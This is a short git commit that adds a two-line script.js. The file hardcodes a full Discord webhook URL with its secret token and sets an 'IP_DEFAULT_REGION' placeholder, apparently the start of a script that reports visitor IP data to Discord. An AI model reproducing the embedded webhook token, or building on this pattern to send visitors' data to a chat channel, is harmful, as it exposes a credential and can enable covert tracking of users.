2e6a092cc6d4eaf90a574f8b11194356962e6027
coconut7373 <130824794+coconut7373@users.noreply.github.com>
2023-07-14 19:40:54 +0900

    Update script.js

---
+++ script.js
@@ -0,0 +1,2 @@
+var wbhk = 'https://discord.com/api/webhooks/1129328426503905351/rX4l5Sv1Y0UAYbrmzFj6G2jyRroHyOnhXfeyS-0knV9eabFntCPfjqZ4hnAzXxVp6FQD' 
+ var regions = 'IP_DEFAULT_REGION'; // Dont Delete/Change Here !
